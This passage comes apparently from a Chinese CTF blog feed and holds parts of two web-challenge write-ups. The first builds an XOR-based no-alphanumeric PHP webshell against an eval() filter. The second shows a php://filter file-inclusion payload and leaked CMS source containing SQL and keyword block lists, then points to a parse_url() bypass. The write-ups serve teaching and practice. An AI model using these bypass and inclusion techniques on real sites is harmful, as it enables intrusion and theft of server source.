class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>仔细观察一下正则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br></code></pre></td></tr></table></figure><p>一看就知道是无字母数字webshell，我们可以用取反、异或、自增、或、与进行构造</p><p>但是这里过滤了 ~ | &amp;  ，所以只有自增和异或了，但是自增会导致过长，所以采取<strong>异或</strong></p><p>我们先写一个脚本来看看可以使用哪些字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 获取可以使用哪些字符</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;`~_&amp;.,|=[\x7F]+/i&#x27;</span>,<span class="hljs-variable">$c</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;:  &quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&quot;  +  &quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$j</span>).PHP_EOL;<br>        &#125;<br>&#125;<br><br>输出：<br>   !<span class="hljs-comment">#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;</span><br></code></pre></td></tr></table></figure><p>可见，我们可以使用 <code>$ &#123; &#125; ; ^</code> 并且根据字符数限制，我们可以联想到使用GET传参的方式：<code>$_GET[1]</code></p><p>但是这里中括号 <code>[</code>被过滤了，我们可以使用 <code>&#123;&#125;</code> 代替：<code>$_GET&#123;1&#125; = $_GET[1]</code></p><p>但是这些字符都使用不了怎么办？</p><p>我们需要使用 <code>^</code> 进行异或构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$arr</span> = [<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-variable">$arr</span>)&amp;&amp;<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$s</span>,<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>))==<span class="hljs-literal">false</span>&amp;&amp;<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$s</span>,<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>))==<span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; : &quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;  +  &quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)).PHP_EOL;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出有很多，但是由于这里有字符种类的限制，所以我们尽量使用有一个异或值是一样的：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cos">_ : <span class="hljs-built_in">%FE</span>  +  <span class="hljs-built_in">%A</span>1<br>T : <span class="hljs-built_in">%FE</span>  +  <span class="hljs-built_in">%AA</span><br>G : <span class="hljs-built_in">%FE</span>  +  <span class="hljs-built_in">%B</span>9<br>E : <span class="hljs-built_in">%FE</span>  +  <span class="hljs-built_in">%BB</span><br>_ : <span class="hljs-built_in">%FF</span>  +  <span class="hljs-built_in">%A</span>0<br>T : <span class="hljs-built_in">%FF</span>  +  <span class="hljs-built_in">%AB</span><br>G : <span class="hljs-built_in">%FF</span>  +  <span class="hljs-built_in">%B</span>8<br>E : <span class="hljs-built_in">%FF</span>  +  <span class="hljs-built_in">%BA</span><br></code></pre></td></tr></table></figure><p>（这里需要知道，<strong>url编码后为<code>%FF</code>的值与其他值进行异或的话，其实是将该值取反</strong>，因为其二进制值为全1）</p><p>于是我们可以将这些值拼接起来，调用<code>get_the_flag</code>函数：</p><p>&#96;$</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EasyWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>eating_cms</title>
    <link href="/2023/08/24/eating_cms/"/>
    <url>/2023/08/24/eating_cms/</url>
    
    <content type="html"><![CDATA[<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>首先我们先访问 <code>/register.php</code> 注册一个账号</p><p>然后登录时抓包：（好像没啥用）</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142327608.png" alt="image-20230414232759433"></p><p>登录进去后，观察到了url：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">28</span>cccbf3-a44a-<span class="hljs-number">489</span>b-bd83-<span class="hljs-number">4</span>c91fd1d739e.node4.buuoj.cn:<span class="hljs-number">81</span>/user.php?page=guest<br></code></pre></td></tr></table></figure><p><code>page=guest</code>，看起来应该是文件包含，我们尝试一下文件包含漏洞：</p><p>获取user.php源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">user.php?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=user<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142330547.png" alt="image-20230414233012336"></p><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">filter_directory</span>();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后读取function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Hacker</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">Hacker</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">session_destroy</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>重点观察一下这些代码：</p><p>这里存在 <code>parse_url()</code>解析漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ 